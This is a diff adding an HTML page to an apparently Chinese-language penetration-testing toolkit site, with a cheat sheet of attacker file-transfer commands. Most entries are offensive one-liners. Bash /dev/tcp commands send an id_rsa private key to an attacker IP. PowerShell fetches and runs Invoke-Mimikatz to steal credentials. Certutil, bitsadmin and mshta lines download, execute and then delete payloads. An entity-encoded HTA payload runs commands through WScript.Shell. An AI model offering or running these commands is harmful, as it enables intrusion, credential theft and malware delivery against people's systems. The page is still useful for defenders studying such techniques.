@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>渗透平台 - C1O2A3</title>
+  <link rel="stylesheet" href="./src/css/layui.css">
+<style type="text/css">
+.layui-layout-admin .layui-body {
+    position: fixed;
+    top: 60px;
+    bottom: 44px;
+}
+.myselect {
+  outline-style: none;
+  border-bottom-color:  #ccc;
+  border-top: 0px;
+  border-left: 0px;
+  border-right: 0px;
+  padding: 30px;
+  margin-top: 15px;
+  padding-top: 16px;
+  overflow: hidden;
+  font-size: 15px;
+}
+.myinput{
+  width: 90%;
+  outline-style: none;
+  border-bottom-color:  #ccc;
+  border-top: 0px;
+  border-left: 0px;
+  border-right: 0px;
+  padding: 30px;
+  margin-top: 15px;
+  padding-top: 16px;
+  overflow: hidden;
+  font-size: 15px;
+}
+.mymd5{
+  margin-top: 15px;
+  /*padding-top: 66px;*/
+}
+.myinput:hover {
+    border-bottom-color:  #c51152;
+    -webkit-box-shadow: 0 3px 0 0 #c51152;
+    box-shadow: 0 3px 0 0 #c51152;
+}
+.myinput:focus {
+    border-bottom-color:  #33ccff;
+    -webkit-box-shadow: 0 3px 0 0 #33ccff;
+    box-shadow: 0 3px 0 0 #33ccff;
+}
+</style>
+</head>
+<body class="layui-layout-body">
+<div class="layui-layout layui-layout-admin">
+  <div class="layui-header layui-bg-blue">
+    <div class="layui-logo">渗透平台</div>
+
+    <!-- 头部区域（可配合layui已有的水平导航） -->
+    <ul class="layui-nav layui-layout-left">
+ <!--      <li class="layui-nav-item"><a href="">控制台</a></li>
+      <li class="layui-nav-item"><a href="">商品管理</a></li>
+      <li class="layui-nav-item"><a href="">用户</a></li> -->
+<!--       <li class="layui-nav-item">
+        <a href="javascript:;">其它系统</a>
+        <dl class="layui-nav-child">
+          <dd><a href="">邮件管理</a></dd>
+          <dd><a href="">消息管理</a></dd>
+          <dd><a href="">授权管理</a></dd>
+        </dl>
+      </li> -->
+    </ul>
+    <ul class="layui-nav layui-layout-right layui-bg-blue">
+      <li class="layui-nav-item">
+        <a href="javascript:;">
+          <img src="./src/img/test.jpg" class="layui-nav-img">
+          c1o2a3
+        </a>
+        <!-- <dl class="layui-nav-child"> -->
+<!--           <dd><a href="">基本资料</a></dd>
+          <dd><a href="">安全设置</a></dd> -->
+        <!-- </dl> -->
+      </li>
+      <!-- <li class="layui-nav-item"><a href="">退了</a></li> -->
+    </ul>
+  </div>
+  
+  <div class="layui-side layui-bg-blue">
+    <div class="layui-side-scroll">
+      <!-- 左侧导航区域（可配合layui已有的垂直导航） -->
+      <ul class="layui-nav layui-nav-tree layui-bg-blue"  lay-filter="test">
+        <li class="layui-nav-item">
+          <a class="" href="javascript:;">前端工具</a>
+          <dl class="layui-nav-child">
+            <dd><a href="./decode.html">编码解码</a></dd>
+            <dd><a href="./qrcode.html">二维码生成</a></dd>
+            <!-- <dd><a href="./codebeautify.html">代码美化</a></dd> -->
+            <dd><a href="./passwd.html">随机密码生成器</a></dd>
+            <dd><a href="./idcard.html">身份证号码生成</a></dd>
+          </dl>
+        </li>
+        <li class="layui-nav-item">
+          <a href="javascript:;">安全工具</a>
+          <dl class="layui-nav-child">
+            <dd><a href="./googlehacking.html">google hacking</a></dd>
+            <dd><a href="./search.html">综合搜索</a></dd>
+            <dd><a href="./getAV.html">Windows杀软识别</a></dd>
+            <dd><a href="./tiquan.html">Windows提权辅助</a></dd>
+            <dd><a href="./shell.html">反弹shell编码</a></dd>
+<!--             <dd><a href="">超链接</a></dd> -->
+          </dl>
+        </li>
+        <li class="layui-nav-item layui-nav-itemed">
+          <a href="javascript:;">常用资料</a>
+          <dl class="layui-nav-child">
+            <dd><a href="./linux.html">Linux常用命令</a></dd>
+            <dd><a href="./windows.html">windows常用命令</a></dd>
+            <dd><a href="./powershell.html">powershell常用命令</a></dd>
+            <dd class="layui-this"><a href="./down.html">传输方法常用命令</a></dd>
+<!--             <dd><a href="">超链接</a></dd> -->
+          </dl>
+        </li>
+<!--         <li class="layui-nav-item"><a href="">云市场</a></li>
+        <li class="layui-nav-item"><a href="">发布商品</a></li> -->
+      </ul>
+    </div>
+  </div>
+  
+  <div class="layui-body ">
+    <!-- 内容主体区域 -->
+    <div class="layui-collapse" lay-accordion="" style="padding: 15px; ">
+      <center>  <h1>传输方法</h1></center>
+      <hr class="layui-border-blue">
+      <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
+        <legend>传输方法常用命令</legend>
+      </fieldset>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">Bash上传</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li><b># 通过HTTP上传文件(需要在攻击者机器上运行HTTP服务)</b></li>
+              <li>bash -c 'echo -e "POST / HTTP/0.9 $(&#x3c;id_rsa)" &#x3e; /dev/tcp/10.10.164.167/1337' </li>
+              <li><b># 通过TCP窃取文件# 用Netcat监听端口1337 +输出重定向</b></li>
+              <li>nc -l -p 1337 > data</li>
+              <li>bash -c 'cat id_rsa &#x3e; /dev/tcp/10.10.164.167/1337' </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">Bash下载 </h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li><b># Send via netcat 通过netcat发送</b></li>
+              <li>nc -l -p 7777 < id_rsa</li>
+              <li><b># 在另一台机器上下载文件</b></li>
+              <li>bash -c 'cat < /dev/tcp/127.0.0.1/7777 > id_rsa'</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">Netcat</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li><b>#上传payload</b></li>
+              <li>nc -lnvp 7777</li>
+              <li>nc 127.0.0.1 7777 < id_rsa</li>
+              <li><b># 下载</b></li>
+              <li>nc 127.0.0.1 7777 < id_rsa</li>
+              <li>nc -lnvp 7777 > file_saved</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">Python</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li><b># Python3 HTTP Server</b></li>
+              <li>python3 -m http.server 7777</li>
+              <li><b># Python2 HTTP Server</b></li>
+              <li>python -m SimpleHTTPServer 7777</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">SCP</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li><b># 从本地主机上传到远程计算机</b></li>
+              <li>scp id_rsa username@127.0.0.1:~/destination -P 7777</li>
+              <li><b># 从远程计算机下载</b></li>
+              <li>scp user@127.0.0.1:~/path_to_file file_saved -P 7777</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">bitsadmin命令（只能命令下载到指定路径上，win7以上）</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>bitsadmin /transfer myDownLoadJob /download /priority normal "http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg" "d:\abc.jpg"</li>
+              <li>bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&%APPDATA%\d90f.exe&del %APPDATA%\d90f.exe</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">powershell</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz</li>
+              <li>powershell -exec bypass -f \\webdavserver\folder\payload.ps1</li>
+              <li>powershell (new-object System.Net.WebClient).DownloadFile( ‘http://192.168.168.183/1.exe’,’C:\111111111111111.exe’)</li>
+              <li>powershell -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://img5.cache.netease.com/photo/0001/2013-03-28/8R1BK3QO3R710001.jpg','d:\\1.jpg')</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">mshta</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))</li>
+              <li>mshta http://webserver/payload.hta (可以使用短域名 例如--->短域名：http://sina.lt/-->mshta http://t.cn/RYUQyF8)</li>
+              <li>mshta \\webdavserver\folder\payload.hta</li>
+              <li><b># payload.hta内容</b></li>
+              <li><pre class="layui-code">&#x3C;&#x48;&#x54;&#x4D;&#x4C;&#x3E;
+&#x3C;&#x6D;&#x65;&#x74;&#x61;&#x20;&#x68;&#x74;&#x74;&#x70;&#x2D;&#x65;&#x71;&#x75;&#x69;&#x76;&#x3D;&#x22;&#x43;&#x6F;&#x6E;&#x74;&#x65;&#x6E;&#x74;&#x2D;&#x54;&#x79;&#x70;&#x65;&#x22;&#x20;&#x63;&#x6F;&#x6E;&#x74;&#x65;&#x6E;&#x74;&#x3D;&#x22;&#x74;&#x65;&#x78;&#x74;&#x2F;&#x68;&#x74;&#x6D;&#x6C;&#x3B;&#x20;&#x63;&#x68;&#x61;&#x72;&#x73;&#x65;&#x74;&#x3D;&#x75;&#x74;&#x66;&#x2D;&#x38;&#x22;&#x3E;
+&#x3C;&#x48;&#x45;&#x41;&#x44;&#x3E;
+&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x6C;&#x61;&#x6E;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3D;&#x22;&#x56;&#x42;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3E;
+&#x57;&#x69;&#x6E;&#x64;&#x6F;&#x77;&#x2E;&#x52;&#x65;&#x53;&#x69;&#x7A;&#x65;&#x54;&#x6F;&#x20;&#x30;&#x2C;&#x20;&#x30;
+&#x57;&#x69;&#x6E;&#x64;&#x6F;&#x77;&#x2E;&#x6D;&#x6F;&#x76;&#x65;&#x54;&#x6F;&#x20;&#x2D;&#x32;&#x30;&#x30;&#x30;&#x2C;&#x2D;&#x32;&#x30;&#x30;&#x30;
+&#x53;&#x65;&#x74;&#x20;&#x6F;&#x62;&#x6A;&#x53;&#x68;&#x65;&#x6C;&#x6C;&#x20;&#x3D;&#x20;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x4F;&#x62;&#x6A;&#x65;&#x63;&#x74;&#x28;&#x22;&#x57;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x2E;&#x53;&#x68;&#x65;&#x6C;&#x6C;&#x22;&#x29;
+&#x6F;&#x62;&#x6A;&#x53;&#x68;&#x65;&#x6C;&#x6C;&#x2E;&#x52;&#x75;&#x6E;&#x20;&#x22;&#x63;&#x61;&#x6C;&#x63;&#x2E;&#x65;&#x78;&#x65;&#x22;
+&#x73;&#x65;&#x6C;&#x66;&#x2E;&#x63;&#x6C;&#x6F;&#x73;&#x65;
+&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
+&#x3C;&#x62;&#x6F;&#x64;&#x79;&#x3E;
+&#x64;&#x65;&#x6D;&#x6F;
+&#x3C;&#x2F;&#x62;&#x6F;&#x64;&#x79;&#x3E;
+&#x3C;&#x2F;&#x48;&#x45;&#x41;&#x44;&#x3E;
+&#x3C;&#x2F;&#x48;&#x54;&#x4D;&#x4C;&#x3E;</pre></li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">cmd</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>cmd.exe /k < \\webdavserver\folder\batchfile.txt</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+      <div class="layui-collapse" lay-filter="test">
+        <div class="layui-colla-item">
+          <h2 class="layui-colla-title">certutil</h2>
+          <div class="layui-colla-content">
+            <ul>
+              <li>certutil -urlcache -split -f http://webserver/payload payload</li>
+              <li>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll</li>
+              <li>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe</li>
+              <li>certutil -urlcache -split -f http://site.com/a a.exe && a.exe &&  del a.exe && certutil -urlcache -split -f http://192.168.254.102:80/a delete</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="layui-footer">
+    <!-- 底部固定区域 -->
+    © C1O2A3
+  </div>
+</div>
+<script src="./src/layui.js"></script>
+<script>
+//JavaScript代码区域
+layui.use(['form','element','layer'], function(){
+  var $ = layui.jquery;
+  element = layui.element;
+  layer = layui.layer;
+  form = layui.form;
+  
+});
+</script>
+</body>
+</html>
+      
